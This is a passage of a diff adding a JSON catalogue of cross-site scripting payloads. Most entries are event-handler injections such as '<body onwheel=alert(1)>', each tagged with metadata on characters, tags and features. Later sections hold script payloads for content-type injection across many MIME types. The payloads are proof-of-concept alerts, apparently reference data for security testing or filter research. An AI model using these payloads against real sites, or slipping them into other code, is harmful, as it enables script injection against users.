+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "input",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 47
+      }
+    },
+    {
+      "name": "onselectionchange",
+      "description": "Fires when text selection is changed on the page",
+      "tag_context": "body",
+      "payload": "<body onselectionchange=alert(1)>select some text",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 49
+      }
+    },
+    {
+      "name": "onselectstart",
+      "description": "Fires when beginning a text selection",
+      "tag_context": "body",
+      "payload": "<body onselectstart=alert(1)>select some text",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 45
+      }
+    },
+    {
+      "name": "onsubmit",
+      "description": "Requires a form submission",
+      "tag_context": "form",
+      "payload": "<form onsubmit=alert(1)><input type=submit>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "form",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 43
+      }
+    },
+    {
+      "name": "ontouchcancel",
+      "description": "Fires when the select text, only mobile device",
+      "tag_context": "custom tags",
+      "payload": "<xss ontouchcancel=alert(1)>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 37
+      }
+    },
+    {
+      "name": "ontouchend",
+      "description": "Fires when the touch screen, only mobile device",
+      "tag_context": "body",
+      "payload": "<body ontouchend=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 26
+      }
+    },
+    {
+      "name": "ontouchmove",
+      "description": "Fires when the touch screen and move, only mobile device",
+      "tag_context": "body",
+      "payload": "<body ontouchmove=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 27
+      }
+    },
+    {
+      "name": "ontouchstart",
+      "description": "Fires when the touch screen, only mobile device",
+      "tag_context": "body",
+      "payload": "<body ontouchstart=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 28
+      }
+    },
+    {
+      "name": "onvolumechange",
+      "description": "Requires volume adjustment",
+      "tag_context": "audio",
+      "payload": "<audio autoplay controls onvolumechange=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 103
+      }
+    },
+    {
+      "name": "onwaiting",
+      "description": "Fires when the video/audio attempts to play",
+      "tag_context": "audio",
+      "payload": "<audio controls onwaiting=alert(1)><source src=x type=x></audio>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 64
+      }
+    },
+    {
+      "name": "onwebkitfullscreenchange",
+      "description": "Fires when a video changes full screen status",
+      "tag_context": "video",
+      "payload": "<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "video",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 69
+      }
+    },
+    {
+      "name": "onwebkitmouseforcechanged",
+      "description": "Requires a click from a laptop touchpad.",
+      "tag_context": "custom tags",
+      "payload": "<xss onwebkitmouseforcechanged=alert(1)>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 49
+      }
+    },
+    {
+      "name": "onwebkitmouseforcedown",
+      "description": "Requires a click from a laptop touchpad.",
+      "tag_context": "custom tags",
+      "payload": "<xss onwebkitmouseforcedown=alert(1)>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 46
+      }
+    },
+    {
+      "name": "onwebkitmouseforceup",
+      "description": "Requires a click from a laptop touchpad.",
+      "tag_context": "custom tags",
+      "payload": "<xss onwebkitmouseforceup=alert(1)>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 44
+      }
+    },
+    {
+      "name": "onwebkitmouseforcewillbegin",
+      "description": "Requires a click from a laptop touchpad.",
+      "tag_context": "custom tags",
+      "payload": "<xss onwebkitmouseforcewillbegin=alert(1)>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 51
+      }
+    },
+    {
+      "name": "onwebkitpresentationmodechanged",
+      "description": "Fires when a video changes full screen status",
+      "tag_context": "video",
+      "payload": "<video controls src=validvideo.mp4 onwebkitpresentationmodechanged=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "video",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 76
+      }
+    },
+    {
+      "name": "onwebkitwillrevealbottom",
+      "description": "Requires a click from a laptop touchpad.",
+      "tag_context": "custom tags",
+      "payload": "<xss onwebkitwillrevealbottom=alert(1)>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 48
+      }
+    },
+    {
+      "name": "onwheel",
+      "description": "Fires when you use the mouse wheel",
+      "tag_context": "body",
+      "payload": "<body onwheel=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 23
+      }
+    }
+  ],
+  "content_type_injection_xss": [
+    {
+      "content_type": "text/html",
+      "payload": "<script>alert(document.domain)</script>"
+    },
+    {
+      "content_type": "application/xhtml+xml",
+      "payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>"
+    },
+    {
+      "content_type": "application/xml",
+      "payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>"
+    },
+    {
+      "content_type": "text/xml",
+      "payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>"
+    },
+    {
+      "content_type": "image/svg+xml",
+      "payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>"
+    },
+    {
+      "content_type": "text/xsl",
+      "payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>"
+    },
+    {
+      "content_type": "application/vnd.wap.xhtml+xml",
+      "payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>"
+    },
+    {
+      "content_type": "text/rdf",
+      "payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>"
+    },
+    {
+      "content_type": "application/rdf+xml",
+      "payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>"
+    },
+    {
+      "content_type": "application/mathml+xml",
+      "payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>"
+    },
+    {
+      "content_type": "text/vtt",
+      "payload": "<script>alert(document.domain)</script>"
+    },
+    {
+      "content_type": "text/cache-manifest",
+      "payload": "<script>alert(document.domain)</script>"
+    }
+  ],
+  "response_content_type_injection": [
+    {
+      "content_type": "text/plain; x=x, text/html, foobar",
+      "payload": "<script>alert(document.domain)</script>"
+    },
+    {
+      "content_type": "text/html xxx",
+      "payload": "<script>alert(document.domain)</script>"
+    },
+    {
+      "content_type": "text/html xxx",
+      "payload": "<script>alert(document.domain)</script>"
+    },
+    {
+      "content_type": "text/html, xxx",
+      "payload": "<script>alert(document.domain)</script>"
+    },
+    {
+      "content_type": "text/html; xxx",
+      "payload": "<script>alert(document.domain)</script>"
+    }
+  ]
+}
